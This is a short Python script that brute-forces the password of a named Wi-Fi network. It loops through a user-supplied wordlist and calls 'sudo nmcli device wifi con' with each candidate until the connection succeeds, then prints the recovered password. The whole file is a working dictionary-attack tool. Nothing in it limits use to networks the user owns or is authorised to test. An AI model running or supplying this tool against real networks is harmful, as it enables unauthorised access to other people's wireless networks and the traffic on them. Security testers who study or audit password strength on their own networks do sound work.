import sys
import subprocess
import network_list

def main(SSID=None, Wordlist=None):
    #Some typechecking etc
    try:
        SSID = str(SSID)
    except:
        print("Need to supply a network SSID and a password list")
        return 0

    try:
        dictionary = open(Wordlist, 'r')
    except:
        print("Wordlist supplied not found")
        return 0

    network_list.main()

    #For each password in the dictionary, check the password by attempting
    #to connect to the network with the user supplied SSID. If successful
    #(res is true) then display to screen and quit checking. 
    for network_password in dictionary:
        #print(network_password)
        network_password = network_password.rstrip()
        connect_command = subprocess.Popen(
            ["sudo", "nmcli", "device", "wifi", "con", SSID, "password", network_password],
            stdout=subprocess.PIPE
            )
        if("success" in connect_command.stdout.read().decode()):
            print("[!] Success! SSID: " + SSID + " Password: " + network_password)
            return 0
    print("Password not in dictionary")

if __name__ == "__main__":
    #Checking if we have the necessary arguments from the command line
    try:
        SSID = sys.argv[1]
        dictionary = sys.argv[2]
    except IndexError:
        print("Need to supply a network SSID and a password list")
        exit(0)
    main(SSID, dictionary)
    
